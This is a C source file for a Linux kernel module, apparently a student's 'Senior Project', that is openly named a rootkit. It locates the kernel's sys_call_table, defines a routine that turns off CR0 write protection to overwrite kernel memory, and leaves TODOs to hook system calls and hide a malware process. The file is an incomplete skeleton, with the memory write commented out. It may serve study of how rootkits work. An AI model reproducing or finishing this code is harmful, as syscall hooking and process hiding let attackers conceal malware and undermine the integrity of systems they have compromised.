#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/types.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Noop Noop");
MODULE_DESCRIPTION("Senior Project");
MODULE_VERSION("0.1");

static void mod_writeonly_mem(uint64_t * addr, uint64_t mem)
{
		write_cr0(read_cr0() & ~0x10000);
		addr[0] = mem;
		write_cr0(read_cr0() | 0x10000);
}

static int __init rootkit_init(void)
{
		// Declare variables here (ISOC99)
		uint64_t syscall_table_addr;

		// Here, install initialization procedures
		printk(KERN_INFO "Initializing...\n");

		// TODO: hook syscall table, reset some function pointers
		syscall_table_addr = kallsyms_lookup_name("sys_call_table");
		printk(KERN_INFO "SYSCALL TABLE @ %llx\n", syscall_table_addr);

		// in order to write to syscall table, must fix cr0 to allow write
		// access first!
		// mod_writeonly_mem(syscall_table_addr, 0x1234);

		// TODO: find malware process and remove from process list
		return 0;
}

static void __exit rootkit_exit(void)
{
		// Here, install exit procedures for the rootkit
		printk(KERN_INFO "Exiting...\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
